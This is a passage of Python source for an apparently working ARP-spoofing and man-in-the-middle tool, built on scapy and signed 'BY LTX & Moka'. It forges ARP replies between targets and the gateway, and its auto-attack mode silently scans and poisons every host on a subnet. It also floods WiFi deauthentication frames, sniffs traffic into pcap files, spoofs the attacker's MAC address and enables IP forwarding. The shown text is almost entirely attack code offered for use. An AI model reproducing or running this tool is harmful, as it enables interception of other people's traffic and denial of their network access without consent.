            target_ip = self.args.target
            if self._is_excluded_ip(target_ip, local_ip):
                log_err("Invalid target or target is local/gateway/whitelisted.")
                return False
            target_mac = get_mac(target_ip)
            if not target_mac:
                log_err(f"Cannot resolve MAC for {target_ip}.")
                return False
            with self._targets_lock:
                self.targets = [{"ip": target_ip, "mac": target_mac}]
        elif self.args.all:
            log_info("Auto-Attack Mode: Scanning network silently...")
            devices = silent_scan(self.ip_range)
            with self._targets_lock:
                self.targets = [
                    {"ip": d["ip"], "mac": d["mac"]}
                    for d in devices
                    if not self._is_excluded_ip(d["ip"], local_ip)
                ]
        else:
            devices = visual_scan(self.ip_range)
            if not devices:
                log_err("No devices found.")
                return False
            choice = input(f"\n{Fore.WHITE}[?] Select Target IP: ").strip()
            if self._is_excluded_ip(choice, local_ip):
                log_err("Invalid target or target is local/gateway/whitelisted.")
                return False
            mac = next((d["mac"] for d in devices if d["ip"] == choice), None)
            if mac:
                with self._targets_lock:
                    self.targets = [{"ip": choice, "mac": mac}]
            else:
                log_err("Target not in list.")
                return False
        log_ok(f"{len(self.targets)} target(s) loaded.")
        self._cache_dirty = True
        return bool(self.targets)

    def refresh_target_macs(self):
        now = time.time()
        if now - self.last_mac_refresh < TARGET_MAC_REFRESH_INTERVAL:
            return
        self.last_mac_refresh = now
        with self._targets_lock:
            for t in self.targets:
                new_mac = get_mac(t["ip"])
                if new_mac and new_mac != t["mac"]:
                    log_info(f"MAC updated for {t['ip']}: {t['mac']} -> {new_mac}")
                    t["mac"] = new_mac
                    self._cache_dirty = True

    def refresh_targets_if_needed(self):
        if not self.args.all:
            return
        now = time.time()
        if now - self.last_target_refresh < TARGET_REFRESH_INTERVAL:
            return
        self.last_target_refresh = now
        log_info("Refreshing target list...")
        devices = silent_scan(self.ip_range)
        local_ip = get_local_ip()
        
        with self._targets_lock:
            known_ips = {t["ip"] for t in self.targets}
            for d in devices:
                if not self._is_excluded_ip(d["ip"], local_ip) and d["ip"] not in known_ips:
                    self.targets.append({"ip": d["ip"], "mac": d["mac"]})
                    log_ok(f"New target detected: {d['ip']} ({d['mac']})")
                    self._cache_dirty = True

    def verify_gateway(self) -> bool:
        mac = get_mac(self.gateway)
        if mac:
            self.gateway_mac = mac
            self.consecutive_gateway_failures = 0
            self._cache_dirty = True
            return True
        self.consecutive_gateway_failures += 1
        return False

    def _build_packet_cache(self):
        if not self.gateway_mac:
            self._packet_cache = []
            return
            
        local_ip = get_local_ip()
        with self._targets_lock:
            current_targets = list(self.targets)
            
        self._packet_cache = []
        for t in current_targets:
            if t["ip"] == local_ip:
                continue
            if not t.get("mac"):
                continue
                
            self._packet_cache.append(
                scapy.Ether(src=self.local_mac, dst=t["mac"]) / scapy.ARP(op=2, hwsrc=self.local_mac, pdst=t["ip"], hwdst=t["mac"], psrc=self.gateway)
            )
            self._packet_cache.append(
                scapy.Ether(src=self.local_mac, dst=self.gateway_mac) / scapy.ARP(op=2, hwsrc=self.local_mac, pdst=self.gateway, hwdst=self.gateway_mac, psrc=t["ip"])
            )
            
        self._cache_dirty = False

    def spoof_cycle(self):
        if self._cache_dirty:
            self._build_packet_cache()
            
        if not self._packet_cache or not self.sock:
            return

        try:
            for pkt in self._packet_cache:
                self.sock.send(pkt)
                self.sent += 1
        except Exception as exc:
            log_warn(f"L2 socket send failed: {exc}. Reinitializing socket.")
            try:
                self.sock.close()
            except Exception:
                pass
            try:
                self.sock = conf.L2socket(iface=conf.iface)
            except Exception:
                self.sock = None

    def deauth_thread(self):
        target_ip = self.args.deauth
        target_mac = get_mac(target_ip)
        if not target_mac:
            log_err(f"Deauth: Cannot resolve MAC for {target_ip}. Aborting deauth.")
            return
        if not self.gateway_mac:
            log_err("Deauth: Gateway MAC unknown. Aborting deauth.")
            return
            
        log_info(f"Deauth attack active on {target_ip} ({target_mac}) via {self.gateway_mac}")
        
        # 4-way deauth frame to guarantee disconnect
        deauth_pkts = [
            scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1=target_mac, addr2=self.gateway_mac, addr3=self.gateway_mac) / scapy.Dot11Deauth(reason=7),
            scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1=self.gateway_mac, addr2=target_mac, addr3=target_mac) / scapy.Dot11Deauth(reason=7),
            scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=self.gateway_mac, addr3=self.gateway_mac) / scapy.Dot11Deauth(reason=7),
            scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=target_mac, addr3=target_mac) / scapy.Dot11Deauth(reason=7)
        ]
        
        while not self._stop.is_set():
            for pkt in deauth_pkts:
                try:
                    scapy.sendp(pkt, count=15, inter=0.01, verbose=False)
                except Exception:
                    pass
            self._stop.wait(0.5)

    def watchdog_loop(self):
        while not self._stop.is_set():
            self._stop.wait(CHECK_INTERVAL)
            if self._stop.is_set():
                break
            try:
                ctx = self.resilience.refresh_context()
                if ctx.gateway and ctx.gateway != self.gateway:
                    log_warn(f"Gateway changed: {self.gateway} -> {ctx.gateway}")
                    self.gateway = ctx.gateway
                    self._cache_dirty = True
                if ctx.ip_range and ctx.ip_range != self.ip_range:
                    self.ip_range = ctx.ip_range

                if not self.verify_gateway():
                    log_warn("Gateway unreachable - attempting network recovery...")
                    if not self.args.no_recovery:
                        self.resilience.recover_connectivity()
                        ctx = self.resilience.refresh_context()
                        if ctx.gateway:
                            self.gateway = ctx.gateway
                            self._cache_dirty = True
                        if ctx.ip_range:
                            self.ip_range = ctx.ip_range
                        self.verify_gateway()
                    if self.consecutive_gateway_failures >= 3:
                        log_err("Gateway still unreachable after recovery attempts.")

                if not self.args.no_recovery and not self.resilience.has_internet():
                    log_warn("No internet access detected.")
                    self.resilience.recover_connectivity()

                self.refresh_targets_if_needed()
                self.refresh_target_macs()
            except Exception as exc:
                log_warn(f"Watchdog error: {exc}")

    def run(self):
        if not self.verify_gateway():
            log_err("Could not find Gateway MAC address.")
            if not self.args.no_recovery:
                log_info("Attempting initial network recovery...")
                self.resilience.recover_connectivity()
                ctx = self.resilience.refresh_context()
                if ctx.gateway:
                    self.gateway = ctx.gateway
                    self._cache_dirty = True
                if ctx.ip_range:
                    self.ip_range = ctx.ip_range
                if not self.verify_gateway():
                    sys.exit(1)
            else:
                sys.exit(1)

        try:
            self.sock = conf.L2socket(iface=conf.iface)
            log_ok(f"L2 raw socket opened on {conf.iface}")
        except Exception as exc:
            log_err(f"Failed to open L2 socket: {exc}. Falling back to standard sendp.")
            self.sock = None

        if self.args.sniff or self.args.pcap:
            log_info("Traffic Sniffer: Online")
            sniff_filter = "ip or arp"
            
            def sniff_target():
                pcap_writer = None
                if self.args.pcap:
                    try:
                        pcap_writer = scapy.PcapWriter(self.args.pcap, append=False, sync=True)
                        log_ok(f"Writing traffic to {self.args.pcap}")
                    except Exception as exc:
                        log_err(f"Failed to open PCAP file: {exc}")
                        pcap_writer = None

                def handle_packet(pkt):
                    if pcap_writer:
                        try:
                            pcap_writer.write(pkt)
                        except Exception:
                            pass
                    if self.args.sniff:
                        process_packet(pkt)

                while not self._stop.is_set():
                    try:
                        scapy.sniff(prn=handle_packet, store=False, filter=sniff_filter, timeout=1, stop_filter=lambda _: self._stop.is_set())
                    except Exception:
                        pass
                
                if pcap_writer:
                    try:
                        pcap_writer.close()
                    except Exception:
                        pass

            sniff_thread = threading.Thread(target=sniff_target, daemon=True)
            sniff_thread.start()
        else:
            log_warn("Traffic Sniffer: Offline (Use -s to enable)")

        if self.args.deauth:
            deauth_t = threading.Thread(target=self.deauth_thread, daemon=True)
            deauth_t.start()

        watchdog = threading.Thread(target=self.watchdog_loop, daemon=True)
        watchdog.start()

        safe_print(f"\n{Fore.RED}[!] BY LTX & Moka - ATTACK ACTIVE")
        try:
            while not self._stop.is_set():
                self.spoof_cycle()
                status = "ONLINE" if self.resilience.has_internet() else "OFFLINE"
                with self._targets_lock:
                    target_count = len(self.targets)
                uptime = int(time.time() - self.start_time)
                hours, rem = divmod(uptime, 3600)
                mins, secs = divmod(rem, 60)
                uptime_str = f"{hours:02d}:{mins:02d}:{secs:02d}"
                safe_print(
                    f"\r\033[K{Fore.WHITE}Packets: {Fore.GREEN}{self.sent} "
                    f"{Fore.WHITE}| Targets: {Fore.GREEN}{target_count} "
                    f"{Fore.WHITE}| Internet: {Fore.GREEN if status == 'ONLINE' else Fore.RED}{status} "
                    f"{Fore.WHITE}| Uptime: {Fore.CYAN}{uptime_str} "
                    f"{Fore.WHITE}| Ctrl+C to stop",
                    end="",
                    flush=True
                )
                self._stop.wait(self.args.interval)
        except KeyboardInterrupt:
            self._stop.set()
            self._restore()
            return

    def _restore(self):
        print(f"\n\n{Fore.LIGHTCYAN_EX}[*] Restoring network state... Please wait.")
        with self._targets_lock:
            current_targets = list(self.targets)
        try:
            if self.gateway_mac:
                for t in current_targets:
                    restore(t["ip"], t["mac"], self.gateway, self.gateway_mac)
                    restore(self.gateway, self.gateway_mac, t["ip"], t["mac"])
            log_ok("Network successfully restored. Exit.")
        except Exception:
            log_err("Error during restoration.")
            
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass

def resolve_network_args(args, selected: Optional[NetworkAdapter] = None) -> Tuple[str, str]:
    if not args.ip_range or not args.gateway:
        log_err("Missing network range (-r) or gateway (-g).")
        sys.exit(1)
    if args.ip_range == "UNKNOWN" or not RE_IPV4.match(args.gateway):
        log_err("Invalid network configuration detected.")
        sys.exit(1)
    return args.ip_range, args.gateway

def run_scan_mode(args):
    exit_code = 0
    try:
        print_banner()
        selected = configure_network(args)
        ip_range, _ = resolve_network_args(args, selected)
        log_info(f"Standalone scan mode - range: {ip_range}")
        devices = visual_scan(ip_range)
        if args.output and devices:
            export_scan_results(devices, args.output)
    except KeyboardInterrupt:
        log_info("Stopped by user.")
        exit_code = 0
    except SystemExit as exc:
        exit_code = int(exc.code) if isinstance(exc.code, int) else 1
    except Exception as exc:
        log_err(f"Scan failed: {exc}")
        exit_code = 1
    finally:
        pause_console()
    sys.exit(exit_code)

def run_wifi_scan_mode(args):
    exit_code = 0
    try:
        print_banner()
        if os.name != "nt":
            log_err("WiFi scan is only supported on Windows.")
            exit_code = 1
            return
        resilience = NetworkResilience(NetworkContext())
        resilience.capture_initial_wifi()
        networks = resilience.display_wifi_scan()
        if args.output and networks:
            export_wifi_results(networks, args.output)
    except KeyboardInterrupt:
        log_info("Stopped by user.")
        exit_code = 0
    except SystemExit as exc:
        exit_code = int(exc.code) if isinstance(exc.code, int) else 1
    except Exception as exc:
        log_err(f"WiFi scan failed: {exc}")
        exit_code = 1
    finally:
        pause_console()
    sys.exit(exit_code)

def init_session_logger(log_file: Optional[str]):
    global _session_logger
    _session_logger = SessionLogger(log_file)
    atexit.register(lambda: _session_logger.write("INFO", "Session ended") if _session_logger else None)

def main():
    session = None
    args = get_arguments()

    if args.scan:
        run_scan_mode(args)
    if args.scan_wifi:
        run_wifi_scan_mode(args)

    print_banner()

    if os.name == "nt" and not check_admin_windows():
        log_warn("Running without administrator rights - some features may not work.")
        log_warn("Relaunch without --no-elevate to trigger the UAC prompt.")

    init_session_logger(args.log_file)

    selected = configure_network(args)
    if selected and conf.iface:
        log_info(f"Network interface: {conf.iface} ({selected.name})")
    elif conf.iface:
        log_info(f"Network interface: {conf.iface}")

    if args.spoof_mac and selected:
        apply_spoofed_mac(selected.name)

    args.ip_range, args.gateway = resolve_network_args(args, selected)
    log_info(f"Network: {args.ip_range} | Gateway: {args.gateway}")

    enable_ip_forwarding()

    initial_ctx = NetworkContext(
        ip_range=args.ip_range,
        gateway=args.gateway,
        interface_name=selected.name if selected else "",
    )
    resilience = NetworkResilience(initial_ctx)
    resilience.capture_initial_wifi()
    resilience.refresh_context()

    if not args.no_recovery and not resilience.has_internet():
        log_warn("No internet at startup - running recovery...")
        resilience.recover_connectivity()
        ctx = resilience.refresh_context()
        if ctx.ip_range:
            args.ip_range = ctx.ip_range
        if ctx.gateway:
            args.gateway = ctx.gateway

    session = SpoofSession(args, resilience)
    if not session.setup_targets():
        sys.exit(1)
    session.run()
    sys.exit(0)

if __name__ == "__main__":
    request_admin_elevation()
    
    while True:
        try:
            main()
            break
        except KeyboardInterrupt:
            safe_print(f"\n\n{Fore.LIGHTCYAN_EX}[*] Stopped by user.")
            sys.exit(0)
        except SystemExit as exc:
            if exc.code == 0 or exc.code is None:
                break
            safe_print(f"\n\n{Fore.RED}[!] Script exited with code {exc.code}.")
        except Exception as e:
            safe_print(f"\n\n{Fore.RED}[!!!] UNEXPECTED FATAL ERROR: {e}")
            safe_print(f"{Fore.YELLOW}{traceback.format_exc()}")
            if _session_logger:
                _session_logger.write("FATAL", f"{e}\n{traceback.format_exc()}")
        
        while True:
            try:
                choice = input(f"{Fore.YELLOW}[?] Do you want to restart the script? (y/N): ").strip().lower()
            except EOFError:
                choice = 'n'
                
            if choice in ('y', 'yes'):
                safe_print(f"{Fore.CYAN}[*] Restarting script...")
                time.sleep(1)
                break
            elif choice in ('n', 'no', ''):
                safe_print(f"{Fore.RED}[*] Closing script.")
                sys.exit(1)
            else:
                safe_print(f"{Fore.RED}[!] Invalid choice. Answer Y or N.")